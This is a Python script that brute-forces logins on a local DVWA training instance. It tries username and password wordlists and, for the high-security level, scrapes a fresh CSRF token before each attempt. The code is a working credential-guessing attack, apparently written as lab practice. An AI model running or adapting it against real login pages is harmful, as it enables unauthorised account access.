import requests
from requests import session
import time
from bs4 import BeautifulSoup


url = "http://192.168.21.129/DVWA/login.php"
userlist = open("usernames.txt","r")
passlist = open("passwords.txt","r")

csrf_token = ""

user_list = userlist.read().strip().split("\n")
pass_list = passlist.read().strip().split("\n")

def login_bruteforce():

    for line in user_list:
        for line1 in pass_list:
            data = {"username":line.strip(),"password":line1.strip(),"user_token":csrf_token,"Login":"Login"}
            req = requests.post(url, data=data)
            if 'Welcome to Damn Vulnerable Web Application!' in req.text:
                login_bruteforce.correct_username = line.strip()
                login_bruteforce.correct_password = line1.strip()
                print(f"Correct Set of Credentials is: {login_bruteforce.correct_username} :: {login_bruteforce.correct_password}")
                break
            else:
                print(f"No response. Username: {line.strip()} & Password: {line1.strip()}")
                
    
login_bruteforce()

def bruteforce_high():
    data = {"username":login_bruteforce.correct_username,"password":login_bruteforce.correct_password,"user_token":csrf_token,"Login":"Login"}

    for line in user_list:
        for line1 in pass_list:
            payload = {'username':line.strip(),'password':line1.strip(),'Login':'Login'}

            with session() as c:
                c.post('http://192.168.21.129/DVWA/login.php',data=data)
                response1 = c.get('http://192.168.21.129/DVWA/vulnerabilities/brute/', params=payload)
                time.sleep(1)
                html = response1.text
                soup = BeautifulSoup(html,"html.parser")
                user_token = soup.find('input',{'name':'user_token'})['value']

                print(user_token)

                payload1 = {'username':line.strip(),'password':line1.strip(),'Login':'Login','user_token':user_token}

                response = c.get('http://192.168.21.129/DVWA/vulnerabilities/brute/', params=payload1)

                if "Welcome to the password protected area admin" in response.text:
                    print(f"Login is a success. Correct credentials are username: {line.strip()} and password: {line1.strip()}")
                    break
                else:
                    print(f"Login Failed. Tried {line.strip()} and {line1.strip()}")

bruteforce_high()